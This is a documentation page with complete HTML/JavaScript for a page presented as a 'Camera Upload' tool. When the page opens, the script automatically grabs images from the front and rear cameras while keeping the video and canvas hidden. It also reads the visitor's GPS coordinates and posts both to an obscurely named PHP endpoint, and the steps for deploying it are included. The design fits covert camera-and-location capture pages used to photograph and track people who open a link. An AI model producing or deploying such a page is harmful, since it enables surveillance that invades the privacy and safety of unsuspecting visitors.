### **Complete Documentation for "Upload Camera" Script**

---

#### **Description**
This script is a web application that allows users to:  
1. Capture images using the front and rear cameras of a device.  
2. Retrieve the user's geographical location using the Geolocation API.  
3. Send the captured images and location data to a server in JSON format.  

The script utilizes modern APIs such as **MediaDevices**, **Canvas**, and **Geolocation**, and sends data to a server endpoint using **fetch**.

---

#### **Features**
1. **Device Camera Usage**  
   - Supports front (**user-facing camera**) and rear (**environment-facing camera**) image capture.  
2. **Geographical Location**  
   - Retrieves the user's location (latitude and longitude) using **Geolocation API**.  
3. **Data Transmission to Server**  
   - Sends the captured images and location data in JSON format to a specified server endpoint.  

---

#### **Prerequisites**
1. **Modern Browser**  
   - A browser that supports **MediaDevices API** (e.g., Chrome, Firefox, Edge, etc.).  
2. **HTTPS Connection**  
   - Geolocation access requires an **HTTPS** connection or **localhost**.  
3. **Server Endpoint**  
   - The server must accept **POST** requests with the **Content-Type: application/json** header.  

---

#### **Script Structure**
1. **HTML Elements**
   - `<video>`: Displays the video stream from the camera.  
   - `<canvas>`: Used to store captured images.  
   - `<p>`: Displays a "Loading" message during processing.  

2. **JavaScript Logic**
   - **`startCamera(facingMode)`**: Starts the camera based on the selected mode (front/rear).  
   - **`stopCamera(video)`**: Stops the camera stream.  
   - **`captureImage(video)`**: Captures an image from the `<video>` element and converts it to a Base64 data URL.  
   - **`getUserLocation()`**: Requests and retrieves the user's location.  
   - **`sendData(imageBase64, cameraName)`**: Sends the captured image and location data to the server.  
   - **`captureAndSend()`**: Main function that coordinates capturing images and sending data to the server.  

---

#### **Code**
**HTML + JavaScript**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Upload</title>
</head>
<body>
    <h1>Capture Camera Images</h1>
    <video id="camera" autoplay style="display: none;"></video>
    <canvas id="snapshot" style="display: none;"></canvas>
    <p id="loading" style="display: none;">Processing... Please wait.</p>

    <script>
        async function startCamera(facingMode) {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode },
                audio: false
            });
            const video = document.getElementById('camera');
            video.srcObject = stream;

            return new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve(video);
                };
            });
        }

        function stopCamera(video) {
            const stream = video.srcObject;
            if (stream) {
                const tracks = stream.getTracks();
                tracks.forEach(track => track.stop());
                video.srcObject = null;
            }
        }

        function captureImage(video) {
            const canvas = document.getElementById('snapshot');
            const context = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg');
        }

        async function getUserLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                    }, error => {
                        reject("Location access denied.");
                    });
                } else {
                    reject("Geolocation is not supported by this browser.");
                }
            });
        }

        async function sendData(imageBase64, cameraName) {
            try {
                const location = await getUserLocation();
                const response = await fetch('/data/akdjsodkeodkdoem.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        image: imageBase64,
                        camera: cameraName,
                        latitude: location.latitude,
                        longitude: location.longitude
                    })
                });
                const result = await response.json();
                console.log(result);
            } catch (error) {
                console.error('Error:', error);
            }
        }

        async function captureAndSend() {
            const loading = document.getElementById('loading');
            try {
                loading.style.display = "block";

                const frontCamera = await startCamera("user");
                const frontImage = captureImage(frontCamera);
                stopCamera(frontCamera);
                await sendData(frontImage, "front");

                const backCamera = await startCamera("environment");
                const backImage = captureImage(backCamera);
                stopCamera(backCamera);
                await sendData(backImage, "back");

                alert("Images and location successfully sent to the server.");
            } catch (error) {
                console.error("Error:", error);
                alert(error);
            } finally {
                loading.style.display = "none";
            }
        }

        captureAndSend();
    </script>
</body>
</html>
```

---

#### **How to Use**
1. **Prepare the Server**
   - Ensure the server can accept JSON-formatted data via a POST request at `/data/akdjsodkeodkdoem.php`.

2. **Save the Script**
   - Save the code above as an HTML file, e.g., `camera.html`.

3. **Open in Browser**
   - Open the HTML file in a modern browser that supports camera and geolocation features.

4. **Grant Permissions**
   - Allow the browser to access your camera and location.

5. **Process Images**
   - The script will automatically capture images from the front and rear cameras and retrieve the device's location.

6. **Send to Server**
   - Images and location data will be sent to the server. Check the browser console for the server response.

---

#### **Server Response**
The data sent to the server is in JSON format:
```json
{
    "image": "data:image/jpeg;base64,...", 
    "camera": "front", 
    "latitude": -6.2088, 
    "longitude": 106.8456
}
```

---

#### **Debugging**
1. **Console Logs**:  
   Check the browser console for errors or logs.  
2. **HTTPS Errors**:  
   Ensure the page is served over HTTPS or accessed via **localhost**.  
3. **Server Issues**:  
   Confirm the server endpoint can handle JSON data and return a valid response.

---

If you need additional features or encounter any issues, feel free to reach out!
